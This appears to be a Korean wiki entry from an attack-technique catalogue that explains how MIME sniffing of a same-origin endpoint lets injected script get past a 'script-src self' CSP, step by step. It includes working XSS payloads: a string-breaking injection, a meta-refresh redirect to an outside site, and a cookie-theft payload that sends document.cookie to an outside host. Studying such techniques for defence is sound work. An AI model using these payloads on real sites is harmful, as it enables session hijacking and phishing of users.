---
title: MIME Sniffing CSP Bypass
description: 
published: true
date: 2025-07-31T13:58:08.914Z
tags: attack success validation, data exfiltration, html injection point discovery, csp policy analysis, malicious redirection, cross‑site scripting (xss)
editor: markdown
dateCreated: 2025-07-25T10:14:28.016Z
---

# MIME Sniffing CSP Bypass

## 개요

“MIME Sniffing CSP Bypass”는 브라우저가 응답 헤더의 안전한 MIME 유형(text/plain・application/octet-stream\[B] 등)보다 자체 MIME 스니핑 결과를 우선 해석한다는 점을 파고든다. 공격자는 악성 HTML/JavaScript를 평문 파일로 노출한 뒤동일 출처에서 `<script>` 또는 `<iframe>`으로 불러오면, 브라우저가 이를 차단하지 않는다. 이로써 외견상 강력한 CSP가 적용된 사이트에서도 공격 코드가 실행돼 DOM 위변조, 세션・토큰 탈취, 권한 상승이 가능하며, 최종적으로 사용자 계정과 민감 데이터 노출이 가능하다.

## 분류

> 보안 정책 적용 불일치 (Security Policy Gap)
> → 클라이언트 보안 정책 불일치 (Client-Side Security Policy Mismatch)
> → MIME Sniffing CSP Bypass

## 절차

| Phase          | Description                                                                                                                                                  |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Reconnaissance | 먼저 페이지랑 각종 리소스를 살펴 HTML 삽입이 가능한 엔드포인트를 찾는다. 응답 헤더를 확인해 `script-src 'self'`등 강한 CSP가 적용되어 있음을 확인한다.                                                           |
| Injection-1    | 발견한 취약점에 `<script>` 태그를 삽입해서 스크립트가 들어갈 자리를 확보한다.                                                                                                             |
| Injection-2    | `/js/countdown.php` 같은 두 번째 엔드포인트에 JS 문자열을 끊고 `);alert(1);//` 등을 주입해 악성 스크립트 파일(텍스트/미정 MIME)로 저장한다.                                                          |
| Bypass         | 첫 `<script>` 태그에서 `<script src="/js/countdown.php"></script>`를 불러온다. 같은 출처라 `script-src`를 통과하고, 브라우저는 MIME sniffing을 통해 자바스크립트로 해석하기 때문에 CSP를 우회하고 코드가 실행된다. |
| Validation     | 간단한 `alert(1)` 팝업이나 DevTools 콘솔을 통해 스크립트가 실제 실행되는지 확인한다. 실패 시 페이로드·경로를 조정한다.                                                                                 |
| Exploitation   | MIME-sniffing 후에 DOM 변조, 세션 탈취, 추가 스크립트 로딩 등의 원하는 공격을 수행한다.                                                                                                  |
| Exfiltration   | 쿠키·토큰·파일 등을 외부로 전송해 데이터를 탈취한다.                                                                                                                               |

<div style="text-align: left;">
  <img
    src="/mime_sniffing_csp_bypass.png"
    alt="MIME Sniffing CSP Bypass 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>HTML Injection Point Discovery</td>
      <td>
        <pre><code>&lt;h1&gt;kleiton0x00&lt;/h1&gt;</code></pre>
      </td>
      <td>사용자의 입력값이 HTML 태그로 해석되어 반환되는 엔드포인트를 식별한다. 이는 스크립트 삽입의 기반이 된다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>CSP Policy Analysis</td>
      <td>
        <pre><code>Content-Security-Policy: script-src 'self'</code></pre>
      </td>
      <td>개발자 도구의 콘솔이나 응답 헤더를 통해 CSP 정책을 확인한다. `script-src 'self'`와 같이 현재 도메인 내의 스크립트만 허용하는지 분석하여 우회 전략을 수립한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Injection

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>JavaScript String Breaking</td>
      <td>
        <pre><code>);alert(1);//</code></pre>
      </td>
      <td>(Injection-2) 서버 측 스크립트가 동적으로 JavaScript를 생성할 때, 입력값으로 `);`를 주입하여 기존 구문을 조기에 종료시키고, `alert(1)` 같은 새로운 악성 구문을 삽입한 뒤 `//`로 나머지 코드를 주석 처리한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Script Loading via HTML Injection</td>
      <td>
        <pre><code>&lt;script src='...url...'&gt;&lt;/script&gt;</code></pre>
      </td>
      <td>(Injection-1) HTML 삽입이 가능한 지점에, 외부 스크립트를 로드하는 &lt;script&gt; 태그를 주입한다. 이 태그의 `src` 속성에 악성 스크립트가 포함된 URL을 지정하여 공격을 실행한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Bypass

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>MIME Sniffing via Script Source</td>
      <td>
        <pre><code>&lt;script src='http://website.com/js/countdown.php?end=2534926825);alert(1);//'&gt;&lt;/script&gt;</code></pre>
      </td>
      <td>HTML 삽입이 가능한 곳에 &lt;script&gt; 태그를 삽입하고, `src` 속성으로 악성 스크립트가 주입된 두 번째 엔드포인트를 지정한다. 브라우저는 `text/plain` 등으로 응답된 리소스를 MIME 스니핑을 통해 실행 가능한 스크립트로 재해석하여 CSP의 `script-src` 정책을 우회한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Validation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Proof of Concept Execution</td>
      <td>
        <pre><code>alert(1)</code></pre>
      </td>
      <td>브라우저에서 `alert(1)`과 같은 간단한 코드를 실행시켜, CSP 우회 및 스크립트 실행이 성공했음을 시각적으로 확인한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exploitation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Malicious Redirection</td>
      <td>
        <pre><code>&lt;meta http-equiv="refresh" content="0; url=//portswigger-labs.net"&gt;</code></pre>
      </td>
      <td>CSP 우회 후 스크립트 실행 권한을 이용해, 페이지를 즉시 공격자의 사이트로 리디렉션시키는 &lt;meta&gt; 태그를 DOM에 삽입한다. 이를 통해 사용자를 가짜 로그인 페이지나 악성코드를 유포하는 사이트로 유도하여 추가적인 공격을 수행한다.</td>
      <td>[A]</td>
    </tr>
  </tbody>
</table>

### Exfiltration

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Data Exfiltration via Navigation</td>
      <td>
        <pre><code>&lt;video&gt;&lt;source onerror=location=/\02.rs/+document.cookie&gt;&lt;/video&gt;</code></pre>
      </td>
      <td>location 객체의 주소를 공격자의 서버 URL과 탈취한 쿠키 값으로 조합하여 변경한다. 이로 인해 브라우저는 공격자의 서버로 GET 요청을 보내게 되고, 공격자는 로그에 기록된 쿠키 값을 통해 데이터를 유출받는다.</td>
      <td>[A]</td>
    </tr>
  </tbody>
</table>

## 분류에 해당하는 문서

\[1] [Content-Security-Policy Bypass to perform XSS](https://infosecwriteups.com/content-security-policy-bypass-to-perform-xss-3c8dd0d40c2e)

## 기타 참고문헌

\[A] [Cross-Site Scripting (XSS) Cheat Sheet - 2025 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
\[B] [Media types (MIME types) - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/MIME_types?utm_source=chatgpt.com#applicationoctet-stream)
